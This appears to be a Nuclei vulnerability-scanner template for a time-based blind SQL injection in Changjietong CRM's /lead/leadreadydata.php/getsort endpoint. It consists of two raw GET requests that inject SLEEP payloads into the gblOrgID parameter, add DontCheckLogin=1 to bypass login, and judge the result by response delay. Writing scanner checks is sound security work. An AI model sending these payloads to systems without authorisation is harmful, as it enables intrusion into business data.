id: changjietongCRM-getsort-sql

info:
  name: 畅捷通-畅捷CRM getsort 存在SQL注入漏洞
  author: changjietongCRM
  severity: high
  tags: changjietongCRM

http:
  - raw:
      - |+
        GET /lead/leadreadydata.php/getsort?id=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-&DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
        Connection: close

      - |+
        GET /lead/leadreadydata.php/getsort?id=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(4)))a)--+-&DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
        Connection: close
        Cookie: PHPSESSID=6638f3bc8018972eb
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
          - 302
      - type: dsl
        dsl:
          - 'duration_1>=2 && duration_1<4'  
          - 'duration_2>=4 && duration_2<6'
        condition: and
